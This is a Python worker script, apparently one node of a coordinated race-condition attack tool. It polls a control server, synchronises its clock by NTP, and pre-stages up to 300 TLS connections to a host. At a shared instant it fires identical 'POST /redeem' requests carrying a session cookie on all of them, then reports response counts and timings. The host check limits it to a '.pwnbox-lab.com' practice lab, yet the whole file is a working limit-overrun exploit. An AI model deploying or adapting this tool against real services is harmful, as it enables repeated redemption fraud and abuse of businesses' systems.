#!/usr/bin/env python3
"""Timed authorized-lab requests issued from one persistent egress source."""
import concurrent.futures as cf
import json
import http.client
import os
import socket
import ssl
import statistics
import time
import urllib.request

from worker import ntp_offset, wait_until

URL=os.environ["COORDINATOR_URL"].rstrip("/")
TOKEN=os.environ["CTRL_TOKEN"]
ID=os.environ.get("WORKER_ID","local")


def api(method,path,data=None):
    payload=json.dumps(data).encode() if data is not None else None
    req=urllib.request.Request(URL+path,data=payload,method=method,
              headers={"Authorization":"Bearer "+TOKEN,
                       "Content-Type":"application/json"})
    with urllib.request.urlopen(req,timeout=10) as response:
        return json.load(response)


def run_task(task,offset):
    host=task["host"]
    cookie=task["cookie"]
    count=int(task["count"])
    tag=task["tag"]
    warm=bool(task.get("warm",False))
    release=float(task["release_at"])+float(task.get("offset_ms",0))/1000
    if not host.endswith(".pwnbox-lab.com") or count<1 or count>300:
        return {"worker":ID,"tag":tag,"error":"invalid task"}
    if time.time()+offset > release-1:
        return {"worker":ID,"tag":tag,"error":"task arrived too late"}
    wait_until(release-3,offset)
    ctx=ssl.create_default_context()
    def connect_one(i):
        try:
            raw=socket.create_connection((host,443),timeout=8)
            return i,ctx.wrap_socket(raw,server_hostname=host),time.time()+offset,None
        except Exception as exc:
            return i,None,time.time()+offset,type(exc).__name__
    with cf.ThreadPoolExecutor(max_workers=count) as pool:
        staged=sorted(pool.map(connect_one,range(count)))
    live=[(i,s,t) for i,s,t,e in staged if s is not None]
    errors={}
    for i,s,t,e in staged:
        if e: errors[e]=errors.get(e,0)+1
    warm_counts={}
    if warm:
        def warm_one(item):
            i,s,t=item
            try:
                request=(f"GET /?cw={tag}-{i} HTTP/1.1\r\nHost: {host}\r\n"
                         "Connection: keep-alive\r\n\r\n").encode()
                s.sendall(request)
                s.settimeout(15)
                response=http.client.HTTPResponse(s)
                response.begin()
                status=response.status
                response.read()
                return status
            except Exception:
                return 0
        with cf.ThreadPoolExecutor(max_workers=max(1,count)) as pool:
            warm_statuses=list(pool.map(warm_one,live))
        for status in warm_statuses:
            key=str(status) if status else "error"
            warm_counts[key]=warm_counts.get(key,0)+1
        old_live=live
        live=[item for item,status in zip(old_live,warm_statuses) if status==200]
        for item,status in zip(old_live,warm_statuses):
            if status!=200:item[1].close()
    request=(f"POST /redeem HTTP/1.1\r\nHost: {host}\r\n"
             "User-Agent: authorized-lab-pair-probe/1\r\n"
             f"Cookie: session={cookie}\r\nContent-Length: 0\r\n"
             "Connection: close\r\n\r\n").encode()
    if time.time()+offset>=release:
        for _,s,_ in live:s.close()
        return {"worker":ID,"tag":tag,"error":"staging missed release",
                "staged":len(live),"connect_errors":errors}
    wait_until(release,offset)
    start=time.time()+offset
    sends=[]
    for i,s,t in live:
        try:s.sendall(request);sends.append((i,s,t,True))
        except Exception:sends.append((i,s,t,False))
    span=round((time.time()+offset-start)*1000,2)
    def receive(item):
        i,s,t,sent=item
        try:
            s.settimeout(30)
            first=s.recv(8192)
            observed=time.time()+offset
            if not first:return "eof",observed
            parts=first.split(b"\r\n",1)[0].split(b" ")
            return (str(int(parts[1])) if len(parts)>1 else "bad-http"),observed
        except Exception as exc:
            return type(exc).__name__,None
        finally:s.close()
    with cf.ThreadPoolExecutor(max_workers=max(1,count)) as pool:
        replies=list(pool.map(receive,sends))
    counts={}
    for status,at in replies:counts[status]=counts.get(status,0)+1
    times={}
    for status in counts:
        selected=[round((t-float(task["release_at"]))*1000,1) for s,t in replies if s==status and t]
        if selected:times[status]={"min_ms":min(selected),
                                   "median_ms":round(statistics.median(selected),1),
                                   "max_ms":max(selected)}
    return {"worker":ID,"tag":tag,"count":count,"offset_ms":task.get("offset_ms",0),
            "warm":warm,"warm_counts":warm_counts,
            "start_error_ms":round((start-release)*1000,2),
            "shared_time_offset_ms":round((start-float(task["release_at"]))*1000,2),
            "send_span_ms":span,"staged":len(live),"send_ok":sum(x[3] for x in sends),
            "connect_errors":errors,"counts":counts,"first_bytes":times}


def main():
    try:ip=urllib.request.urlopen("https://api.ipify.org",timeout=8).read().decode().strip()
    except Exception:ip="unavailable"
    offset,server,rtt=ntp_offset()
    api("POST","/register",{"worker":ID,"egress_ip":ip,"ntp_offset_ms":round(offset*1000,2)})
    print(json.dumps({"worker":ID,"registered":True,"egress_ip":ip,
                      "ntp_offset_ms":round(offset*1000,2)}),flush=True)
    deadline=time.monotonic()+1000
    while time.monotonic()<deadline:
        try:
            result=api("GET","/poll?worker="+ID)
            task=result.get("task")
            if task:
                if task.get("type")=="stop":break
                receipt=run_task(task,offset)
                api("POST","/result",receipt)
                print(json.dumps(receipt),flush=True)
        except Exception as exc:
            print(json.dumps({"worker":ID,"poll_error":type(exc).__name__}),flush=True)
        time.sleep(0.25)


if __name__=="__main__":main()
